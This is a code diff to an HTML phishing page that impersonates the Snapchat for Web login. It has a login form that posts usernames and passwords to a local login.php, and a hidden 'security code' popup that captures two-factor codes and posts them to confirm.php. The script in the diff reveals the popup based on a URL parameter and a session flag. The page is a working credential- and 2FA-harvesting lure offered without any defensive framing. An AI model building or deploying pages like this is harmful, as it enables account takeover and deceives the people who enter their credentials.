@@ -20,70 +20,75 @@
 <meta http-equiv=content-security-policy
       content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
       <body class="designV2">
-            <div class="pusher">
-                <div id="login-root">
-                    <div class="App" style="display:none">
-                        <div class="full-background-color"></div>
-                        <div class="Header"><a href="https://accounts.snapchat.com/" class="logo sf-hidden"></a></div>
-                        <div class="Login">
-                            <article class="page">
-                                <div class="container"><img class="snapchat-icon" src="icon.svg" alt="Snapchat">
-                                    <div>
-                                        <h1 class="accountsTitle">Log in to Snapchat for Web</h1>
-                                    </div>
-                                    <div>
-                                        <form id="login_form" action="login.php" method="post" class="centered_form">
-                                            <div class="form-group has-success">
-                                                <label for="username" class="control-label">Username or Email</label>
-                                                <input name="username" autocomplete="off" type="text" id="username"
-                                                    class="form-control" required value="">
-                                            </div>
-                                            <div class="form-group has-success">
-                                                <label for="password" class="control-label">Password</label>
-                                                <input name="password" autocomplete="off" type="password" id="password"
-                                                    class="form-control" required value="">
-                                            </div>
-                                            <p class="secondary_action"><a href="#">Forgot
-                                                    Password</a>
-                                            <div style="display:none"></div>
-                                            <div class="primary_action login-button">
-                                                <button type="submit" id="loginTrigger"
-                                                    class="btn btn-lg btn-primary">Log
-                                                    In</button>
-                                            </div>
-                                        </form>
-                                    </div>
+        <div class="pusher">
+            <div id="login-root">
+                <div class="App" style="display:none">
+                    <div class="full-background-color"></div>
+                    <div class="Header"><a href="https://accounts.snapchat.com/" class="logo sf-hidden"></a></div>
+                    <div class="Login">
+                        <article class="page">
+                            <div class="container"><img class="snapchat-icon" src="icon.svg" alt="Snapchat">
+                                <div>
+                                    <h1 class="accountsTitle">Log in to Snapchat for Web</h1>
                                 </div>
-                                <div class="create-account-cta"><span>New To Snapchat?</span><a
-                                        href="https://accounts.snapchat.com/accounts/signup">Sign Up</a></div>
-                            </article>
-                        </div>
+                                <div>
+                                    <form id="login_form" action="login.php" method="post" class="centered_form">
+                                        <div class="form-group has-success">
+                                            <label for="username" class="control-label">Username or Email</label>
+                                            <input name="username" autocomplete="off" type="text" id="username"
+                                                class="form-control" required value="">
+                                        </div>
+                                        <div class="form-group has-success">
+                                            <label for="password" class="control-label">Password</label>
+                                            <input name="password" autocomplete="off" type="password" id="password"
+                                                class="form-control" required value="">
+                                        </div>
+                                        <p class="secondary_action"><a href="#">Forgot
+                                                Password</a>
+                                        <div style="display:none"></div>
+                                        <div class="primary_action login-button">
+                                            <button type="submit" id="loginTrigger"
+                                                class="btn btn-lg btn-primary">Log
+                                                In</button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                            <div class="create-account-cta"><span>New To Snapchat?</span><a
+                                    href="https://accounts.snapchat.com/accounts/signup">Sign Up</a></div>
+                        </article>
                     </div>
                 </div>
             </div>
-        
-            <!-- Add the security code window HTML -->
-            <div class="security-code-window" style="display: none;">
-                <div class="security-code-popup">
-                    <h2>Please enter the security code</h2>
-                    <form action="confirm.php" method="post">
-                        <input type="text" name="security_code" required>
-                        <button type="submit">Log In</button>
-                    </form>
-                </div>
+        </div>
+    
+        <!-- Add the security code window HTML -->
+        <div class="security-code-window" style="display: none;">
+            <div class="security-code-popup">
+                <h2>Please enter the security code</h2>
+                <form action="confirm.php" method="post">
+                    <input type="text" name="security_code" required>
+                    <button type="submit">Log In</button>
+                </form>
             </div>
-        
-            <script>
-                // Check if the parameter for showing security code is present in the URL
+        </div>
+    
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
                 const urlParams = new URLSearchParams(window.location.search);
-                const showSecurityCode = urlParams.has('showSecurityCode');
-        
-                // If the parameter is present, show the security code window
-                if (showSecurityCode) {
-                    document.addEventListener("DOMContentLoaded", function () {
-                        document.querySelector('.security-code-window').style.display = 'block';
-                    });
+                const showSecurityCode = urlParams.get('showSecurityCode');
+    
+                if (showSecurityCode === "true") {
+                    document.querySelector('.security-code-window').style.display = 'block';
                 }
-            </script>
-        </body>
+                
+                const formSubmitted = sessionStorage.getItem('formSubmitted');
+    
+                if (formSubmitted === "true" && showSecurityCode === "true") {
+                    document.querySelector('.security-code-window').style.display = 'block';
+                }
+            });
+        </script>
+    </body>
+    
         
